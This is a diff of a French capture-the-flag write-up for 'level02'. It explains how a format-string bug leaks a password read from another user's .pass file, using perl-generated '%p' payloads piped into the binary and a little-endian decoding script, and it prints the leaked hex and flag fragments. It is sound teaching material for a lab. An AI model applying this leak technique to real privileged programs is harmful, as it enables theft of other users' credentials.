@@ -1,15 +1,25 @@
 
+Dans cet exercice, le code du binaire lis le fichier ou est stocke le flag
+et enregistre le flag dans `buf_1`:
+
+```c
+FILE* fp = fopen("/home/users/level03/.pass", "r");
+...
+int32_t rax = fread(&buf_1, 1, 0x29, fp);
+```
+Le programme va ensuite nous demander de renseigner un username et un password et comparer le password avec `buf_1`
+
 Dans cet exercice on va chercher a derouler la stack pour identifier ce qui est stocke dans la variable `buf_1`.
+
+
+
+--------------------------
 
 On va utiliser un script pour convertir le code little-endian a big-endian.
 
 Le mot de passe quoi doit trouver est stocke a 2 emplacements memoire
 
 Reperer notre propre input en ecrivant `AAAA` a l'avant de notre input, puis %p %p %p ext.
-
-
-
-
 
 (perl -e '$word = 20;for ($count = $word; $count < $word + 8; $count +=1){    print("%$count\$p ");}pri
 nt("\n");' ; perl -e 'print "\n"' ; cat) | ./level02
@@ -23,3 +33,9 @@ perl -e '$test=pack("H*", "756e505234376848"); @test2 = unpack("V*", $test); pri
 RPnu   Hh74   5JAE    Q9sa   Cqz7   XgNW   h5J5    sXGnPg3HM9Kf
 
 4868373452506e75 51397361354a4145
+
+
+
+# troubleshot
+
+on peut pas ouvrir `.pass` quand on lance le fichier avec gdb car gdb lance l'executable avec les droits `level02`, donc ca ne marche pas de juste lancer gdb et regarder la valeur de la variable buf_1.
